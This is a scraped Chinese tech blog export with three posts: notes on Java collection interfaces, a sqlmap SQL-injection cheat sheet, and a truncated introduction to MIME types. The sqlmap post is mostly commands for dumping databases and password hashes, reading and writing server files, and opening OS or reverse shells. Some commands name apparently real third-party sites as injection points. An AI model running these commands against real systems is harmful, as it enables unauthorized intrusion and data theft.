要这样设计是因为一个集合类可能同时有多个迭代器去遍历他，而每个迭代器遍历到集合的哪里，是每个迭代器自己的事情，彼此不互相干涉，因此才需要额外使用一个内部类去实现迭代器的Iterator 接口 如此当需要用到Iterator来遍历集合时，只需要调用list.iterator()，就能取得一个全新的、不受别人影响的迭代器供自己使用，而迭代器彼此之间也不会互相干涉 至于为什么要特别使用内部类来实现Iterator接口，而不是创建一个Iterator公共类来供所有集合一起使用，是因为迭代器需要知道集合的内部结构，他才能知道要怎么去实现hasNext()、next()、remove()方法，而使用内部类才能无条件的取用外部类的所有信息（包含private的变量和方法），因此才需要将Iterator提取成接口，让每个集合自己使用内部类去实现Iterator接口 为什么Iterator接口，只有hasNext()、next()、remove()方法，而没有add(E)方法? 逻辑上来说，迭代器是一个一个去遍历集合中的元素，而当前iterator 停下的地方，就是迭代到一半的地方 如果当迭代到一半时调用iterator.add()方法，理论上来说，应该是要在当前这个元素E1后面新增一个元素E2，使得下次遍历此集合时，E2一定会出现在E1后面，也就是[….E1 , E2, ….] 假设add()方法是以这个语意为前提的话，那么迭代器不提供此方法是很合理的，对于有序的集合（像是ArrayList）来说，在此元素后面新增一个元素是一个很简单的事情，但是对于无序的集合（像是HashSet）来说，不能保证新插入的这个元素E2一定会在E1后面（因为还得计算HashCode），如此就违反了add()的语意了，这也就是为什么Iterator接口不提供add()方法 另一个说法是，在使用迭代器时，通常就是“遍历”的场景，这种场景下很少会去使用add()方法，因此Iterator接口没必要提供这个方法 listiterator接口 参考：https://www.yiibai.com/java/java-listiterator.html 它从Java 1.2开始提供。 它扩展了Iterator接口。 它仅对List实现的类有用。 与Iterator不同，它支持所有四种操作：CRUD(CREATE，READ，UPDATE和DELETE)。支持add操作。add方法只依赖于迭代器的位置(在光标前插入)， 而 remove 方法依赖于迭代器的状态(删除刚刚越过的元素)。set 方法用一个新元素取代调用 next 或 previous 方法返回的上一个元素。 与Iterator不同，它支持正向和反向迭代。 它是一个双向迭代器。 它没有当前元素; 它的光标位置总是位于调用previous()返回的元素和调用next()返回的元素之间。 Java ListIterator接口具有以下方法。 编号 方法 描述 1 void add(E e) 将指定的元素插入列表中。 2 boolean hasNext() 如果此列表迭代器在向前遍历列表时具有元素，则返回true。 3 boolean hasPrevious() 如果此列表迭代器在反向遍历列表时具有元素，则返回true。 4 E next() 返回列表中的下一个元素。 5 int nextIndex() 返回元素的索引。 6 E previous() 返回列表中的上一个元素并向后移动光标位置。 7 int previousIndex() 返回元素的索引。 8 void remove() 从列表中删除由next()或previous()返回的最后一个元素。 9 void set(E e) 用指定的元素替换由next()或previous()返回的最后一个元素。 RandomAccess接口这个接口不包含任何方法， 不过可以用它来测试一个特定的集合是否支持高效的随机访问： Collection 接口 详细可参考：https://www.jianshu.com/p/b878a4e1c762 • Iterator iterator()返回一个用于访问集合中每个元素的迭代器。• int size()返回当前存储在集合中的元素个数。• boolean isEmpty()如果集合中没有元素， 返回 true。• boolean contains(Object obj)如果集合中包含了一个与 obj 相等的对象， 返回 true。• boolean containsAl 1(Collection other) 如果这个集合包含 other 集合中的所有元素， 返回 trueo • boolean add(Object element) 将一个元素添加到集合中。如果由于这个调用改变了集合，返回 true。 • boolean addAl 1(Col 1 ection other) 将 other 集合中的所有元素添加到这个集合。 如果由于这个调用改变了集合， 返回 true。 • boolean remove(Object obj) 从这个集合中删除等于 obj 的对象。 如果有匹配的对象被删除， 返回 true。 • boolean removeAl 1(Col 1ection other)从这个集合中删除 other 集合中存在的所有元素。如果由于这个调用改变了集合，返回 true。• default boolean removelf(Predicate filter)8 从这个集合删除 filter 返回 true 的所有元素。 如果由于这个调用改变了集合， 则返回 true。 • void clear() 从这个集合中删除所有的元素。 • boolean retainAl 1(Collection other)从这个集合中删除所有与 other 集合中的元素不同的元素。 如果由于这个调用改变了集合， 返回 true。• Object[]toArray()返回这个集合的对象数组。• T[]toArray(T[] arrayToFi11)返回这个集合的对象数组。 如果 arrayToFill 足够大， 就将集合中的元素填入这个数组中。剩余空间填补 null ; 否则， 分配一个新数组， 其成员类型与 arrayToFill 的成员类型相同， 其长度等于集合的大小， 并填充集合元素。 list接口在collection的基础上添加了扩展方法， • ListIterator 1istIterator( )返回一个列表迭代器， 以便用来访问列表中的元素。• ListIterator 1istIterator(int index )返回一个列表迭代器， 以便用来访问列表中的元素， 这个元素是第一次调用 next 返回的给定索引的元素。• void add( int i ,E element )在给定位置添加一个元素。• void addAll ( int i ,Collection&lt;? extends E&gt; elements )将某个集合中的所有元素添加到给定位置。• E remove( int i )删除给定位置的元素并返回这个元素。• E get( int i )获取给定位置的元素。• E set(int i ,E element )用新元素取代给定位置的元素， 并返回原来那个元素。• int indexOf( Object element )返回与指定元素相等的元素在列表中第一次出现的位置， 如果没有这样的元素将返回-1。• int 1 astlndexOf(Object element)返回与指定元素相等的元素在列表中最后一次出现的位置， 如果没有这样的元素将返回 -U set接口 参考：https://www.yiibai.com/java/java_set_interface.html Set是一个不能包含重复元素的Collection。它模拟了数学集合抽象。 Set接口仅包含从Collection接口继承的方法，并添加禁止重复元素的限制。 Set还为equals和hashCode操作的行为添加了一个更强的规范，允许Set实例有意义地进行比较，即使它们的实现类型不同。 Set声明的方法如下表中所示 - 编号 方法 描述 1 add() 添加一个对象到集合中，禁止添加相同的元素。 2 clear() 从集合中删除所有对象。 3 contains() 如果指定的对象是集合中的元素，则返回true。 4 isEmpty() 如果集合没有元素，则返回true。 5 iterator() 返回集合的Iterator对象，该对象可用于检索对象。 6 remove() 从集合中删除指定对象。 7 size() 返回集合中的元素数。 和list对比： 1、List 接口能直接设置或获取某个元素的值，而Set接口不能。 2、List 接口能直接在指定位置删除、增加元素，而Set接口不能。 3、List 接口有 listIterator 方法，可以获得 ListIterator 对象，而 Set 接口不能。Set 只能通过 iterator 迭代的方式获取元素。 sortedset接口 参考：https://www.yiibai.com/java/java_sortedset_interface.html SortedSet接口扩展Set接口并声明按升序排序的集合的行为。除了Set定义的那些方法之外，SortedSet接口还声明了一些自己的方法。 SortedSet 和 SortedMap 接口会提供用于排序的比较器对象，这两个接口定义了可以得到集合子集视图的方法。 当调用集中没有包含任何项时，有几种方法抛出NoSuchElementException异常。当对象与集合中的元素不兼容时，抛出ClassCastException异常。 如果尝试使用null对象并且集合中不允许null，则抛出NullPointerException异常。 编号 方法 描述 1 Comparator comparator() 返回调用有序集的比较器。如果自然排序用于此集合，则返回null。 2 Object first() 返回调用有序集合中的第一个元素。 3 SortedSet headSet(Object end) 返回一个SortedSet对象，其中包含调用有序集合中包含的小于end的元素。返回的有序集中的元素也是调用的有序集引用。 4 Object last() 返回调用有序集合中的最后一个元素。 5 SortedSet subSet(Object start, Object end) 返回一个SortedSet对象，其中包含start至end-1之间的元素。返回集合中的元素也是调用对象引用。 6 SortedSet tailSet(Object start) 返回一个SortedSet对象，其中包含有序集合中包含的大于或等于start的元素。返回集中的元素也是调用对象引用。 NavigableSet接口 • E higher(E value)• E lower(E value)返回大于 value 的最小元素或小于 value 的最大元素，如果没有这样的元素则返回 null。• E ceiling(E value)• E floor(E value)返回大于等于 vaiue 的最小元素或小于等于 value 的最大元素， 如果没有这样的元素则返回 null。• E pollFirst()• E pollLast删除并返回这个集中的最大元素或最小元素， 这个集为空时返回 null。• Iterator descendingIterator()返回一个按照递减顺序遍历集中元素的迭代器。 queue接口12345678910111213141516171819202122public interface Queue&lt;E&gt; extends Collection&lt;E&gt; &#123; //.... //extend correction 具有集合的基本功能 // 添加一个元素到队列，在先进先出队列中，是添加到队列尾部 // 如果由于容量不足插入失败，则抛出异常，不会返回false boolean add(E e); // 和add方法一样，不过不同之处在于，这个方法添加失败一般是返回false，而不是抛出异常 boolean offer(E e); // 移除队列尾部的元素（最后进来的元素），如果队列为空，则抛出异常，不返回false E remove(); // 和remove方法一样，不过这个方法在队列为空时会返回false，不抛出异常 E poll(); // 查看队列头部的元素（最先进来的元素），如果队列为空，则抛出异常，不返回null E element(); // 和element方法一样，不过这个在队列为空时，返回null，不抛出异常 E peek();&#125; • boolean add(E element )• boolean offer(E element )如果队列没有满，将给定的元素添加到这个双端队列的尾部并返回 true。如果队列满了，第一个方法将拋出一个 IllegalStateException, 而第二个方法返回 false。• E remove( )• E poll ( )假如队列不空， 删除并返回这个队列头部的元素。 如果队列是空的，第一个方法抛出NoSuchElementException, 而第二个方法返回 null。• E element( )• E peek( )如果队列不空，返回这个队列头部的元素， 但不删除。 如果队列空，第一个方法将拋出一个 NoSuchElementException, 而第二个方法返回 null。 在JDK里面没有一个队列的实现是仅仅实现Queue接口定义的功能。可能是因为具有基本功能的队列实现比较简单而且实际的用途有点少。队列的实现基本可以分为：1.并发队列(ConcurrentLinkedQueue); 2.阻塞队列（ArrayBlockingQueue， LinkedBlockingQueue）； 3.双端队列（Deque, ArrayDeque, LinkedList, ConcurrentLinkedDeque）; 4:优先级队列(PriorityQueue, PriorityBlockingQueue) 每种类型的队列都是针对不同的应用场景的，所以还是需要仔细区分来选择合适的队列实现。 deque接口123456789101112131415161718192021222324252627282930313233343536public interface Deque&lt;E&gt; extends Queue&lt;E&gt; &#123; // *** Deque methods *** void addFirst(E e); void addLast(E e); boolean offerFirst(E e); boolean offerLast(E e); E removeFirst(); E removeLast(); E pollFirst(); E pollLast(); E getFirst(); E getLast(); E peekFirst(); E peekLast(); boolean removeFirstOccurrence(Object o); boolean removeLastOccurrence(Object o); // *** Queue methods *** boolean add(E e); boolean offer(E e); E remove(); E poll(); E element(); E peek(); // *** Stack methods *** void push(E e); E pop(); // *** Collection methods *** boolean remove(Object o); boolean contains(Object o); public int size(); Iterator&lt;E&gt; iterator(); Iterator&lt;E&gt; descendingIterator();&#125; Deque表示双端队列。双端队列是在两端都可以进行插入和删除的队列。Deque是一个比Stack和Queue功能更强大的接口，它同时实现了栈和队列的功能。ArrayDeque和LinkeList实现了Deque接口。 注意：Deque既可以用作后进先出的栈，也可以用作先进先出的队列。 表：Deque接口方法表 Queue Method Equivalent Deque Method add(e) addLast(e) offer(e) offerLast(e) remove() removeFirst() poll() pollFirst() element() getFirst() peek() peekFirst() 表：Deque与Queue方法比较表 插入 addFirst和offerFirst在Deque实例头部插入元素。 addLast和offerLast在Deque实例尾部插入元素。 当Deque实现类为有限容量时，优先使用offerFirst和offerLast，因为addFirst在队列满的时候可能会插入失败而抛出异常。 删除 removeFirst和pollFirst从Deque实例头部移除元素。 removeLast和pollLast从Deque实例尾部移除元素。 当Deque为空时，pollFirst和pollLast将会返回null，而removeFirst和removeLast将会抛出异常。 检索 getFirst和peekFirst获取Deque实例的第一个元素，但是不会将元素从Deque实例中删除。类似地，getLast和peekLast获取最后一个元素。当Deque为空时，getFirst和getLast将会抛出异常，而peekFirst和peekLast将会返回null。 除了基本的插入、删除和检索方法外，还有两个预定义的方法：removeFirstOccurence和removeLastOccurence。这两个方法见名知意。返回true的时候表示元素存在于队列，并且已经被删除。返回false时表示元素不存在于队列中，并且队列没有改变。 map接口 Map集合的特点是：通过key值找到对应的value值，key值是唯一的，value可以重复。Map中的元素是无序的，但是也有实现了排序的Map实现类，如：TreeMap。 上面Map接口提供的方法大致可以分为下面几种： 1、put/putAll/remove/clear 增加删除 get/values 获取值 2、containKey/containValue 判断 3、entrySet/keySet 获取迭代 4、equals/hashcode 比较 基本上所有的 Map 接口实现类都使用 put() 方法存入数据、用get() 方法去除数据，使用 entrySet/keySet 迭代获取 Map 数据。 序号 方法 1 void clear( ) 从此映射中移除所有映射关系（可选操作）。 2 boolean containsKey(Object k) 如果此映射包含指定键，则返回 true。 3 boolean containsValue(Object v) 如果此映射将一个或多个键映射到指定值，则返回 true。 4 Set entrySet( ) 返回此映射中包含的映射关系的 Set 视图。 5 boolean equals(Object obj) 比较指定的对象与此映射是否相等。 6 Object get(Object k) 返回指定键所映射的值；如果此映射不包含该键的映射关系，则返回 null。 7 int hashCode( ) 返回此映射的哈希码值。 8 boolean isEmpty( ) 如果此映射未包含键-值映射关系，则返回 true。 9 Set keySet( ) 返回此映射中包含的键的 Set 视图。 10 Object put(Object k, Object v) 将指定的值与此映射中的指定键关联（可选操作）。 11 void putAll(Map m) 从指定映射中将所有映射关系复制到此映射中（可选操作）。 12 Object remove(Object k) 如果存在一个键的映射关系，则将其从此映射中移除（可选操作）。 13 int size( ) 返回此映射中的键-值映射关系数。 14 Collection values( ) 返回此映射中包含的值的 Collection 视图。 15 default V getOrDefault(Object key, V defaultValue) 获得与键关联的值； 返回与键关联的对象， 或者如果未在映射中找到这个键， 则返回defaultValue。 sortedmap接口SortedSet 和 SortedMap 接口会提供用于排序的比较器对象，这两个接口定义了可以得到集合子集视图的方法。 TreeMap实现了SortedMap接口，保证了有序性。默认的排序是根据key值进行升序排序，也可以重写comparator方法来根据value进行排序。 SortedMap接口扩展了Map接口，它确保条目按升序键维护。 当调用映射中没有项时，有几种方法会抛出NoSuchElementException异常。当对象与映射中的元素不兼容时，抛出ClassCastException异常。如果在映射中不允许null时，如果尝试使用null对象，则抛出NullPointerException异常。 SortedMap接口声明的方法如下表中所示 - 编号 方法 描述 1 Comparator comparator() 返回调用有序映射的比较器。如果自然排序用于调用映射，则返回null。 2 Object firstKey() 返回调用映射中的第一个键。 3 SortedMap headMap(Object end) 返回键小于结束的那些映射条目的有序映射。 4 Object lastKey() 返回调用映射中的最后一个键。 5 SortedMap subMap(Object start, Object end) 返回包含键大于或等于start且小于end的条目的映射。 6 SortedMap tailMap(Object start) 返回包含键大于或等于start的条目的映射。 navigablemap接口NavigableSet扩展了 SortedSet 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748SortedMap提供了获取最大值与最小值的方法，但对于一个已经排序的数据集，除了最大值与最小值之外，我们还想对任何一个元素，找到比它小的值和比它大的值，还可以按照原有的顺序倒序排序等，这时候就运用到NavigableMap接口提供的如下方法。// 找到第一个比指定的key小的值Map.Entry&lt;K,V&gt; lowerEntry(K key);// 找到第一个比指定的key小的keyK lowerKey(K key);// 找到第一个小于或等于指定key的值Map.Entry&lt;K,V&gt; floorEntry(K key);// 找到第一个小于或等于指定key的keyK floorKey(K key);// 找到第一个大于或等于指定key的值Map.Entry&lt;K,V&gt; ceilingEntry(K key);//找到第一个大于或等于指定key的keyK ceilingKey(K key);// 找到第一个大于指定key的值Map.Entry&lt;K,V&gt; higherEntry(K key);//找到第一个大于指定key的keyK higherKey(K key);// 获取最小值Map.Entry&lt;K,V&gt; firstEntry();// 获取最大值Map.Entry&lt;K,V&gt; lastEntry();// 删除最小的元素Map.Entry&lt;K,V&gt; pollFirstEntry();// 删除最大的元素Map.Entry&lt;K,V&gt; pollLastEntry();//返回一个倒序的MapNavigableMap&lt;K,V&gt; descendingMap();// 返回一个Navigable的key的集合，NavigableSet和NavigableMap类似NavigableSet&lt;K&gt; navigableKeySet();// 对上述集合倒序NavigableSet&lt;K&gt; descendingKeySet();","categories":[{"name":"java","slug":"java","permalink":"http://aotle.top/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://aotle.top/tags/java/"}]},{"title":"sqlmap使用总结","slug":"sqlmap使用总结","date":"2020-12-02T11:35:30.000Z","updated":"2020-12-02T11:49:18.362Z","comments":true,"path":"2020/12/02/sqlmap_used/","link":"","permalink":"http://aotle.top/2020/12/02/sqlmap_used/","excerpt":"sqlmap常用命令","text":"sqlmap常用命令 最基本命令12345678910111213sqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batchsqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch --dbssqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch --current-dbsqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch --userssqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch --current-usersqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch --passwordssqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch -D 数据库名称 --tablessqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch -D 数据库名称 -T 表名 --columnssqlmap -u \"http://xxx\" --cookie=\"aa=bb; cc=dd\" --batch -D 数据库名称 -T 表名 -C \"user,password,字段名\" --dumpsqlmap -u \"http://xxx\" --data=\"id=1&amp;Submit=Submit\" --cookie=\"aa=bb; cc=dd\" --batch //postsqlmap -u \"http://xxx\" --data=\"id=1&amp;Submit=Submit\" --second- url=\"http://xxxx\" --cookie=\"aa=bb; cc=dd\" –batch//设置二级响应结果的url 常用命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290--dbnms\\----common-tables 暴力猜表名-u #注入点-f #指纹判别数据库类型-b #获取数据库版本信息-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)-D “” #指定数据库名-T “” #指定表名-C “” #指定字段-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume)–columns #列出字段–current-user #获取当前用户名称–current-db #获取当前数据库名称–users #列数据库所有用户–passwords #数据库用户所有密码–privileges #查看用户权限(–privileges -U root)-U #指定数据库用户–dbs #列出所有数据库–tables -D “” #列出指定数据库中的表–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段–dump-all #列出所有数据库所有表–exclude-sysdbs #只列出用户自己新建的数据库和表–dump -T “数据库” -D “表” -C “字段” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)–os #指定系统(Linux,Windows)-v #详细的等级(0-6)0：只显示Python的回溯，错误和关键消息。1：显示信息和警告消息。2：显示调试消息。3：有效载荷注入。4：显示HTTP请求。5：显示HTTP响应头。6：显示HTTP响应页面的内容–privileges #查看权限–is-dba #是否是数据库管理员–roles #枚举数据库用户角色–udf-inject #导入用户自定义函数（获取系统权限）–union-check #是否支持union 注入–union-cols #union 查询表记录–union-test #union 语句测试–union-use #采用union 注入–union-tech orderby #union配合order by–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″)–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)–referer “” #使用referer欺骗(–referer “http://www.baidu.com”)–user-agent “” #自定义user-agent–proxy “http://127.0.0.1:8118″ #代理注入–string “” #指定关键词–threads #采用多线程(–threads 3)–sql-shell #执行指定sql命令–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )–file-read #读取指定文件–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)–file-dest #要写入的文件绝对路径–os-cmd=id #执行系统命令–os-shell #系统交互shell–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)–os-smbrelay #–os-bof #–reg-read #读取win系统注册表–priv-esc #–time-sec= #延迟设置 默认–time-sec=5 为5秒-p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入–eta #盲注sqlmap.py -u url 判断sqlmap.py -u url --is-dba 判断是不是root权限sqlmap.py -u url --is-dba -v 这是判断当前数据库的使用者是否是dbasqlmap.py -u url --users -v 0 这句的目的是列举数据库的用户sqlmap.py -u url --passwords -v 0 这句的目的是获取数据库用户的密码sqlmap.py -u url --privileges -v 0 这是判断当前的权限sqlmap.py -u url --dbs -v 0 这句的目的是将所有的数据库列出来sqlmap.py -u url --tables -D '表' 爆表sqlmap.py -u url --columns -T ‘表’-D ‘数据库’爆列sqlmap.py -u url --dump -T '表' --start 1 --stop 4 -v 0 这里是查询第2到第4行的内sqlmap.py -u url --dump -all -v 0\\---------------------------------------------------------------------------------------------------------------------------current-user 看看权限…… access注入sqlmap.py -u \"url\" ==检测。sqlmap.py -u \"url\" --tables ==猜表。sqlmap.py -u \"url\" --columns -T \"表名\" ==猜字段sqlmap.py -u \"url\" --dump -T \"表名\" -C \"字段,字段\" ==暴表里面的字段的内容 Mysql数据注入sqlmap.py -u url --privileg ==查看权限(root什么什么的)sqlmap.py -u url --is-dba 判断是不是root权限sqlmap.py -u url --dbs ==获取数据库sqlmap.py -u url --tables -D \"数据库名\" ==获取当中的数据库的表sqlmap.py -u url --columns -D \"数据库名\" -T \"表名\" ==获取数据库 表中的字段sqlmap.py -u url --dump -D \"数据库名\" -T \"表名\" -C \"字段,字段\" ==获取数据库表的字段里的内容 Cookie注入注入点：http://www.ntjx.org/jsj/DownloadShow.asp?id=9sqlmap.py -u \"http://www.ntjx.org/jsj/DownloadShow.asp\" --cookie \"id=9\" --table --level 2 ==暴表名sqlmap.py -u \"http://www.ntjx.org/jsj/DownloadShow.asp\" --cookie \"id=9\" --columns -T \"表名\" --level 2 ==暴表的字段sqlmap.py -u \"http://www.ntjx.org/jsj/DownloadShow.asp\" --cookie \"id=9\" --dump -T \"表名\" -C \"字段,字段\" --level 2 ==暴表的字段内容 post登陆注入 mssqlsqlmap.py -u \"http://testasp.vulnweb.com/Login.asp\" --data \"tfUName=12345&amp;tfUPass=12345\"sqlmap.py -u \"http://testasp.vulnweb.com/Login.asp\" --data \"tfUName=12345&amp;tfUPass=12345\" --dbs ==获取数据库名sqlmap.py -u \"http://testasp.vulnweb.com/Login.asp\" --data \"tfUName=12345&amp;tfUPass=12345\" --tables -D \"数据库名\" ==列表sqlmap.py -u \"http://testasp.vulnweb.com/Login.asp\" --data \"tfUName=12345&amp;tfUPass=12345\" --columns -T \"表名\" -D \"数据库名\" ==暴字段sqlmap.py -u \"http://testasp.vulnweb.com/Login.asp\" --data \"tfUName=12345&amp;tfUPass=12345\" --dump --columns -C \"字段,字段\" -T \"表\" -D \"数据名\" ==暴字段内容 直接拿shell或者执行命令（需要权限很大跟物理路径）sqlmap.py -u url --os-shellsqlmap.py -u url --os-cmd=ipconfig 伪静态注入注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html （注意：要加个* 哪里存在注入就加上 * 号）sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --dbs ==获取数据库名sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --tables -D \"数据名\" ==获取数据库当中的表sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --columns -D \"数据名\" -T \"表名\" ==获取数据库的表中的字段sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --dump -D \"数据名\" -T \"表名\" -C \"字段,字段\" ==获取数据库的表中的字段内容 请求延时（一般突破防火墙）第一种方法：sqlmap.py -u url --delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）第二种方法： sqlmap.py -u url --safe-freq 3 （注意：3是3次的意思。。）可以组合使用 sqlmap.py -u url --delay 2 --safe-freq 3利用文件来注入GET /?id=1 HTTP/1.1Host: www.why25.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0x-forwarded-for: 1*(存在注入)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=109b6bcfd7ec056764c71aa62a4d6638Connection: keep-aliveCache-Control: max-age=0 星号(*) 指定注入点 sqlmap -r c:/s.txt --level 3 --dbms=mysql --risk 1 注意： --level 是测试等级意思就是说我要更加耐心仔仔细细的加强检测等级3 如果没有level 默认等级是1的别人再次整理过的-p 指定测试参数-b 获取banner--dbs 列举数据库--is-dba 是否是管理员权限--current-db 当前数据库--current-user 当前用户--tables 列举数据库的表名--count 检索所有条目数--columns 获取表的列名--dump 获取表中的数据，包含列--dump-all 转存DBMS数据库所有表项目--level 测试等级(1-5)，默认为1-v 显示详细信息读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容-D 指定数据库-T 指定表-C 指定列--dbms=mysql oracle mssql 指定数据库---参照官方文档：https://github.com/sqlmapproject/sqlmap/wiki/Usage。-b 获取banner-p 指定测试参数-g 从google中获取URL , -g \"inurl:aspx?id=\"--gpage=GOOGLEPAGE 指定Google页码--union-check 是否支持union 注入--union-cols union 查询表记录--union-test union 语句测试--union-use 采用union 注入--proxy 代理注入---threads 采用多线程--user-agent 自定义user-agent--referer=REFERER HTTP referer头--proxy=PROXY 使用代理--string 指定关键词--tor 创建tor的匿名网络--predict-output 常见的查询输出预测--keep-alive 使用持久HTTP（S）连接--eval=EVALCODE 所使用HTTP参数污染-a,-all 查询所有--hostname 主机名--is-dbs 是否是管理员权限--users 枚举所有用户--passwords 枚举所有用户密码--roles 枚举所有用户角色--schema 枚举DBMS模式--count 检索所有条目数--dump 转存DBMS数据库表项目，需要制定字段名称(列名称)--dump-all 转存DBMS数据库所有表项目--search 搜索列，表或数据库名称--exclude-sysdbs 在枚举表时排除系统数据库--sql-query=query 执行SQL语句--file-read=RFILE 读取操作--file-write=WFILE 写入操作--file-dest=DFILE 绝对路径写入--reg-read 阅读一个Windows注册表项值--reg-add 增加一个Windows注册表项值数据--reg-del 删除一个Windows注册表项值数据--reg-key=REGKEY Windows注册表键--reg-value=REGVAL Windows注册表键值-- reg-data=REGDATA Windows注册表的键值项数据--reg-type=REGTYPE Windows注册表键的值类型--csv-del=CSVDEL 划定CSV输出中使用的字符 (default \",\")--dump-format=DUMP 转存数据格式(CSV (default), HTML or SQLITE)--hex 使用十六进制数据检索功能--output-dir=ODIR 自定义输出的目录路径--update 更新SQLMap--purge-output 安全的删除所有内容输出目录--check-waf 启发式检查WAF / IPS / IDS保护--os-pwn 反弹shell--cookie=COOKIE 指定HTTP Cookie ，预登陆--random-agent 使用随机选定的User-Agent头--tamper=TAMPER 使用SQLMap插件--level 测试等级(1-5)，默认为1","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"http://aotle.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"什么是MIME TYPE","slug":"什么是MIME-TYPE","date":"2020-12-01T14:57:39.000Z","updated":"2020-12-03T13:54:40.766Z","comments":true,"path":"2020/12/01/whatmime/","link":"","permalink":"http://aotle.top/2020/12/01/whatmime/","excerpt":"介绍了MIME TYPE","text":"介绍了MIME TYPE 一、首先，我们要了解浏览器是如何处理内容的。在浏览器中显示的内容有 HTML、有 XML、有 GIF、还有 Flash ……那么，浏览器是如何区分它们，决定什么内容用什么形式来显示呢？答案是 MIME Type，也就是该资源的媒体类型。 媒体类型通常是通过 HTTP 协议，由 Web 服务器告知浏览器的，更准确地说，是通过 Content-Type 来表示的，例如: Content-Type: text/HTML 表示内容是 text/HTML 类型，也就是超文本文件。为什么是“text/HTML”而不是“HTML/text”或者别的什么？MIME Type 不是个人指定的，是经过 ietf 组织协商，以 RFC 的形式作为建议的标准发布在网上的，大多数的 Web 服务器和用户代理都会支持这个规范 (顺便说一句，Email 附件的类型也是通过 MIME Type 指定的)。 通常只有一些在互联网上获得广泛应用的格式才会获得一个 MIME Type，如果是某个客户端自己定义的格式，一般只能以 application/x- 开头。 XHTML 正是一个获得广泛应用的格式，因此，在 RFC 3236 中，说明了 XHTML 格式文件的 MIME Type 应该是 application/xHTML+XML。 当然，处理本地的文件，在没有人告诉浏览器某个文件的 MIME Type 的情况下，浏览器也会做一些默认的处理，这可能和你在操作系统中给文件配置的 MIME Type 有关。比如在 Windows 下，打开注册表的“HKEY_LOCAL_MACHINESOFTWAREClassesMIMEDatabaseContent Type”主键，你可以看到所有 MIME Type 的配置信息。 二、在把输出结果传送到浏览器上的时候，浏览器必须启动适当的应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。 例如，架设你要传送一个Microsoft Excel文件到客户端。那么这时的MIME类型就是“application/vnd.ms-excel”。在大多数实际情况中，这个文件然后将传送给Execl来处理（假设我们设定Execl为处理特殊MIME类型的应用程序）。在ASP中，设定MIME类型的方法是通过Response对象的ContentType属性。 多媒体文件格式MIME 最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。 MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。 每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。 常见的MIME类型 超文本标记语言文本 .html,.html text/html普通文本 .txt text/plainRTF文本 .rtf application/rtfGIF图形 .gif image/gifJPEG图形 .ipeg,.jpg image/jpegau声音文件 .au audio/basicMIDI音乐文件 mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 .ra, 